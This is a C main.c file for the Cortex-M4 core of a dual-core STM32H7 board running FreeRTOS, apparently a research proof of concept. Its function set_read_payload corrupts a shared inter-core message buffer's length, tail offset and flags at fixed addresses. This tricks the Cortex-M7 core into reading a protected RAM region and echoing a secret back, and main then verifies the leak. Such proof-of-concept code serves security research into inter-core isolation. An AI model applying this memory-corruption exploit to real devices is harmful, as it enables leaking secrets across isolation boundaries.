/* USER CODE BEGIN Header */
/**
 ******************************************************************************
 * @file           : main.c
 * @brief          : Main program body
 ******************************************************************************
 * @attention
 *
 * Copyright (c) 2024 STMicroelectronics.
 * All rights reserved.
 *
 * This software is licensed under terms that can be found in the LICENSE file
 * in the root directory of this software component.
 * If no LICENSE file comes with this software, it is provided AS-IS.
 *
 ******************************************************************************
 */
/* USER CODE END Header */
/* Includes ------------------------------------------------------------------*/
#include "main.h"
#include "stdio.h"
#include "string.h"
/* FreeRTOS includes. */
#include "FreeRTOS.h"
#include "task.h"
#include "message_buffer.h"
#include "MessageBufferAMP.h"
#include "stm32h7xx_nucleo.h"

#ifndef HSEM_ID_0
#define HSEM_ID_0 (0U) /* HW semaphore 0*/
#endif
// if this define is there, the attacker respects the lock -> experiment 1
// comment it to make the attacker ignore the lock -> experiment 2
#define SYNC

#define HAL_TIMEOUT_VALUE 0xFFFFFFFF
#define countof(a) (sizeof(a) / sizeof(*(a)))

/* Private variables ---------------------------------------------------------*/
volatile int current_state = 0;

UART_HandleTypeDef huart2;


void inc_state(){
	current_state++;
}


// manipulate the xMessageBuffer in a way that allows for arbitrary reading
// to be called before sending
void set_read_payload(){
	// the type definitions are hidden in the code, so we do it ourselves
	typedef struct {
		// these are offsets into the data buffer
		// xhead is the offset where we continue writing
		// xtail is the offset where we continue reading
		size_t xTail;
		size_t xHead;
		size_t xLength;
		size_t xTriggerLevelBytes;
		void* xTaskWaitingToReceive;
		void* xTaskWaitingToSend;
		uint8_t* buffer; // this points to the buffer that is used for data storing
		uint8_t ucFlags;
		uint32_t uxStreamBufferNumber;
	} MessageBuffer;
	// we know where the struct is in memory
	MessageBuffer* mb = (MessageBuffer*) 0x38000004;

	// set length sufficiently large that we pass boundary checks
	mb->xLength = 0xffffffff;

	// we want to read <target_addr>
	// example: m7 stores some secret in 0x20001000 ram region
	// this ram region is not readable by m4
	uint32_t target_addr = 0x20001000;

	// our starting address is 0x38000040 (the buffer), so we need to find
	// xTail such that 0x38000040 + xTail = <target_addr>

	// this computation will overflow, but no problem, size_t is signed
	// but even if unsigned, we can set buffer base and index, so we modify
	// the buffer base instead in that scenario
	mb->xTail = target_addr - 0x38000040;

	// set the flags to 2. If ucFlags & 1 == 1, this is considered a message buffer
	// and the first 4 bytes are interpreted as length. In our case, we want to read
	// the data directly and repurpose the struct then to a streambuffer, which does
	// not start with a length
	mb->ucFlags = 2;
}

// do a blocking semaphore acquire
void maybe_lock(){
#ifdef SYNC
	while (HAL_HSEM_Take(HSEM_ID_0, HSEM_PROCESSID_MIN) != HAL_OK){};
#endif
}

// unlock the semaphore
void unlock(){
#ifdef SYNC
	HAL_HSEM_Release(HSEM_ID_0, HSEM_PROCESSID_MIN);
#endif
}


/**
 * @brief  The application entry point.
 * @retval int
 */
int main(void)
{
	uint32_t *sync_counter = 0x38000100;

	/* USER CODE BEGIN Boot_Mode_Sequence_1 */
	/*HW semaphore Clock enable*/
	__HAL_RCC_HSEM_CLK_ENABLE();
	/* Activate HSEM notification for Cortex-M4*/
	HAL_HSEM_ActivateNotification(__HAL_HSEM_SEMID_TO_MASK(HSEM_ID_0));
	/*
  Domain D2 goes to STOP mode (Cortex-M4 in deep-sleep) waiting for Cortex-M7 to
  perform system initialization (system clock config, external memory configuration.. )
	 */
	HAL_PWREx_ClearPendingEvent();
	HAL_PWREx_EnterSTOPMode(PWR_MAINREGULATOR_ON, PWR_STOPENTRY_WFE, PWR_D2_DOMAIN);
	/* Clear HSEM flag */
	__HAL_HSEM_CLEAR_FLAG(__HAL_HSEM_SEMID_TO_MASK(HSEM_ID_0));

	HAL_Init();

	MX_USART2_UART_Init();
	while(*sync_counter < 1){};
	if( xCoreMessageBuffer == NULL )
	{
		Error_Handler();
	}
	xMessageBufferReset(xCoreMessageBuffer);
	uint8_t welcome[] = "\r\nStarting experiment!\r\n";
	HAL_UART_Transmit(&huart2, (uint8_t*)&welcome, countof(welcome)-1, HAL_TIMEOUT_VALUE);

	// step 1: send a message to m7 to reflect it back
	uint8_t step_1[] = "\r\nStarting step 1!\r\n";
	HAL_UART_Transmit(&huart2, (uint8_t*)&step_1, countof(step_1)-1, HAL_TIMEOUT_VALUE);
	char cString[6] = {'H','e','l','l','o', 0x0a};
	maybe_lock();
	xMessageBufferSend( xCoreMessageBuffer, ( void * ) cString, 5, 0 );

	// this is still part of step 1.
	// after the sending, we immediately modify the metadata
	// this has to happen before the other side reads our packet, as
	// we want to trick the other side to read from a different address
	set_read_payload();
	unlock();
	uint8_t step_1_done[] = "\r\nStep 1 done!\r\n";
	HAL_UART_Transmit(&huart2, (uint8_t*)&step_1_done, countof(step_1_done)-1, HAL_TIMEOUT_VALUE);
	// step 1 complete
	(*sync_counter)++;
	// wait for the other side to echo it back
	while(*sync_counter < 3){};

	// check that we leaked the secret
	uint8_t* leak = 0x38000040 + 4 + 5;
	uint8_t expected[] = "leak";
	uint8_t correct = 1;
	for (int i = 0; i<4; i++){
		if (leak[i] != expected[i]){
			correct = 0;
		}
	}
	if (correct){
		uint8_t msg[] = "\r\nE3 worked!\r\n";
		HAL_UART_Transmit(&huart2, (uint8_t*)&msg, countof(msg)-1, HAL_TIMEOUT_VALUE);
	}

	while(1){
	}
}


/**
 * @brief USART2 Initialization Function
 * @param None
 * @retval None
 */
void MX_USART2_UART_Init(void)
{

	/* USER CODE BEGIN USART2_Init 0 */

	/* USER CODE END USART2_Init 0 */

	/* USER CODE BEGIN USART2_Init 1 */

	/* USER CODE END USART2_Init 1 */
	huart2.Instance = USART2;
	huart2.Init.BaudRate = 9600;
	huart2.Init.WordLength = UART_WORDLENGTH_8B;
	huart2.Init.StopBits = UART_STOPBITS_1;
	huart2.Init.Parity = UART_PARITY_NONE;
	huart2.Init.Mode = UART_MODE_TX_RX;
	huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
	huart2.Init.OverSampling = UART_OVERSAMPLING_16;
	huart2.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
	huart2.Init.ClockPrescaler = UART_PRESCALER_DIV1;
	huart2.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
	if (HAL_UART_Init(&huart2) != HAL_OK)
	{
		Error_Handler();
	}
	if (HAL_UARTEx_SetTxFifoThreshold(&huart2, UART_TXFIFO_THRESHOLD_1_8) != HAL_OK)
	{
		Error_Handler();
	}
	if (HAL_UARTEx_SetRxFifoThreshold(&huart2, UART_RXFIFO_THRESHOLD_1_8) != HAL_OK)
	{
		Error_Handler();
	}
	if (HAL_UARTEx_DisableFifoMode(&huart2) != HAL_OK)
	{
		Error_Handler();
	}
	/* USER CODE BEGIN USART2_Init 2 */

	/* USER CODE END USART2_Init 2 */

}

/* USER CODE BEGIN 4 */
void HAL_GPIO_EXTI_Callback(uint16_t GPIO_Pin)
{
	if (GPIO_Pin == GPIO_PIN_13)
	{
		inc_state();
		/* Toggle LED2 */
		BSP_LED_Toggle(LED2);
	}
}
/* USER CODE END 4 */

/**
 * @brief  Period elapsed callback in non blocking mode
 * @note   This function is called  when TIM2 interrupt took place, inside
 * HAL_TIM_IRQHandler(). It makes a direct call to HAL_IncTick() to increment
 * a global variable "uwTick" used as application time base.
 * @param  htim : TIM handle
 * @retval None
 */
void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim)
{
	/* USER CODE BEGIN Callback 0 */

	/* USER CODE END Callback 0 */
	if (htim->Instance == TIM2) {
		HAL_IncTick();
	}
	/* USER CODE BEGIN Callback 1 */

	/* USER CODE END Callback 1 */
}

/**
 * @brief  This function is executed in case of error occurrence.
 * @retval None
 */
void Error_Handler(void)
{
	/* USER CODE BEGIN Error_Handler_Debug */
	/* User can add his own implementation to report the HAL error return state */
	__disable_irq();
	while (1)
	{
	}
	/* USER CODE END Error_Handler_Debug */
}


#ifdef  USE_FULL_ASSERT
/**
 * @brief  Reports the name of the source file and the source line number
 *         where the assert_param error has occurred.
 * @param  file: pointer to the source file name
 * @param  line: assert_param error line source number
 * @retval None
 */
void assert_failed(uint8_t *file, uint32_t line)
{
	/* USER CODE BEGIN 6 */
	/* User can add his own implementation to report the file name and line number,
     ex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */
	/* USER CODE END 6 */
}
#endif /* USE_FULL_ASSERT */
